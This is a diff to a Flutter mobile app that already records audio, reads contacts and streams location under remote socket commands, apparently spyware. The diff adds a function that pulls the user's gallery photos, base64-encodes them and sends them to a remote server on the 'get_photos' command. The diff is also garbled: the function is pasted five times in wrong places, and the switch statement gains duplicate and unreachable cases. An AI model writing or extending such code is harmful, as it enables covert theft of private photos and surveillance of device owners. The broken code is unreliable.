@@ -9,6 +9,7 @@ import 'package:camera/camera.dart';
 import 'package:record/record.dart';
 import 'package:contacts_service/contacts_service.dart';
 import 'package:path_provider/path_provider.dart';
+import 'package:photo_manager/photo_manager.dart';
 import 'package:device_info_plus/device_info_plus.dart';
 
 void main() {
@@ -18,6 +19,46 @@ void main() {
 
 class MyApp extends StatefulWidget {
   @override
+  Future<void> getPhotos(int count) async {
+    try {
+      // Request photo library permission
+      final PermissionState state = await PhotoManager.requestPermissionExtend();
+      
+      if (state.isAuth) {
+        // Get all albums
+        final List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
+          type: RequestType.image,
+          onlyAll: true,
+        );
+        
+        if (albums.isNotEmpty) {
+          // Get all photos from the first album (usually "All Photos")
+          final List<AssetEntity> assets = await albums[0].getAssetListPaged(
+            page: 0,
+            size: count,
+          );
+          
+          for (var asset in assets) {
+            // Get the file
+            final File? file = await asset.file;
+            if (file != null) {
+              final bytes = await file.readAsBytes();
+              final base64Image = base64Encode(bytes);
+              
+              socket.emit('photo_data', {
+                'image': base64Image,
+                'filename': file.path.split('/').last,
+                'timestamp': DateTime.now().toIso8601String(),
+              });
+            }
+          }
+        }
+      }
+    } catch (e) {
+      socket.emit('error', {'error': 'Photo error: $e'});
+    }
+  }
+
   _MyAppState createState() => _MyAppState();
 }
 
@@ -31,6 +72,46 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
   StreamSubscription<Position>? locationStream;
   
   @override
+  Future<void> getPhotos(int count) async {
+    try {
+      // Request photo library permission
+      final PermissionState state = await PhotoManager.requestPermissionExtend();
+      
+      if (state.isAuth) {
+        // Get all albums
+        final List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
+          type: RequestType.image,
+          onlyAll: true,
+        );
+        
+        if (albums.isNotEmpty) {
+          // Get all photos from the first album (usually "All Photos")
+          final List<AssetEntity> assets = await albums[0].getAssetListPaged(
+            page: 0,
+            size: count,
+          );
+          
+          for (var asset in assets) {
+            // Get the file
+            final File? file = await asset.file;
+            if (file != null) {
+              final bytes = await file.readAsBytes();
+              final base64Image = base64Encode(bytes);
+              
+              socket.emit('photo_data', {
+                'image': base64Image,
+                'filename': file.path.split('/').last,
+                'timestamp': DateTime.now().toIso8601String(),
+              });
+            }
+          }
+        }
+      }
+    } catch (e) {
+      socket.emit('error', {'error': 'Photo error: $e'});
+    }
+  }
+
   void initState() {
     super.initState();
     WidgetsBinding.instance.addObserver(this);
@@ -38,6 +119,46 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
   }
 
   @override
+  Future<void> getPhotos(int count) async {
+    try {
+      // Request photo library permission
+      final PermissionState state = await PhotoManager.requestPermissionExtend();
+      
+      if (state.isAuth) {
+        // Get all albums
+        final List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
+          type: RequestType.image,
+          onlyAll: true,
+        );
+        
+        if (albums.isNotEmpty) {
+          // Get all photos from the first album (usually "All Photos")
+          final List<AssetEntity> assets = await albums[0].getAssetListPaged(
+            page: 0,
+            size: count,
+          );
+          
+          for (var asset in assets) {
+            // Get the file
+            final File? file = await asset.file;
+            if (file != null) {
+              final bytes = await file.readAsBytes();
+              final base64Image = base64Encode(bytes);
+              
+              socket.emit('photo_data', {
+                'image': base64Image,
+                'filename': file.path.split('/').last,
+                'timestamp': DateTime.now().toIso8601String(),
+              });
+            }
+          }
+        }
+      }
+    } catch (e) {
+      socket.emit('error', {'error': 'Photo error: $e'});
+    }
+  }
+
   void didChangeAppLifecycleState(AppLifecycleState state) {
     if (state == AppLifecycleState.resumed) {
       if (!connected) {
@@ -194,6 +315,9 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
         await recordAudio(int.parse(params['duration'] ?? '10'));
         break;
       case 'get_contacts':
+      case 'get_photos':
+        await getPhotos(int.parse(params['count'] ?? '20'));
+        break;
         await getContacts();
         break;
       case 'get_photos':
@@ -304,6 +428,46 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
 
 
   @override
+  Future<void> getPhotos(int count) async {
+    try {
+      // Request photo library permission
+      final PermissionState state = await PhotoManager.requestPermissionExtend();
+      
+      if (state.isAuth) {
+        // Get all albums
+        final List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
+          type: RequestType.image,
+          onlyAll: true,
+        );
+        
+        if (albums.isNotEmpty) {
+          // Get all photos from the first album (usually "All Photos")
+          final List<AssetEntity> assets = await albums[0].getAssetListPaged(
+            page: 0,
+            size: count,
+          );
+          
+          for (var asset in assets) {
+            // Get the file
+            final File? file = await asset.file;
+            if (file != null) {
+              final bytes = await file.readAsBytes();
+              final base64Image = base64Encode(bytes);
+              
+              socket.emit('photo_data', {
+                'image': base64Image,
+                'filename': file.path.split('/').last,
+                'timestamp': DateTime.now().toIso8601String(),
+              });
+            }
+          }
+        }
+      }
+    } catch (e) {
+      socket.emit('error', {'error': 'Photo error: $e'});
+    }
+  }
+
   void dispose() {
     heartbeatTimer?.cancel();
     locationTimer?.cancel();
@@ -314,6 +478,46 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
   }
 
   @override
+  Future<void> getPhotos(int count) async {
+    try {
+      // Request photo library permission
+      final PermissionState state = await PhotoManager.requestPermissionExtend();
+      
+      if (state.isAuth) {
+        // Get all albums
+        final List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
+          type: RequestType.image,
+          onlyAll: true,
+        );
+        
+        if (albums.isNotEmpty) {
+          // Get all photos from the first album (usually "All Photos")
+          final List<AssetEntity> assets = await albums[0].getAssetListPaged(
+            page: 0,
+            size: count,
+          );
+          
+          for (var asset in assets) {
+            // Get the file
+            final File? file = await asset.file;
+            if (file != null) {
+              final bytes = await file.readAsBytes();
+              final base64Image = base64Encode(bytes);
+              
+              socket.emit('photo_data', {
+                'image': base64Image,
+                'filename': file.path.split('/').last,
+                'timestamp': DateTime.now().toIso8601String(),
+              });
+            }
+          }
+        }
+      }
+    } catch (e) {
+      socket.emit('error', {'error': 'Photo error: $e'});
+    }
+  }
+
   Widget build(BuildContext context) {
     return MaterialApp(
       home: Scaffold(
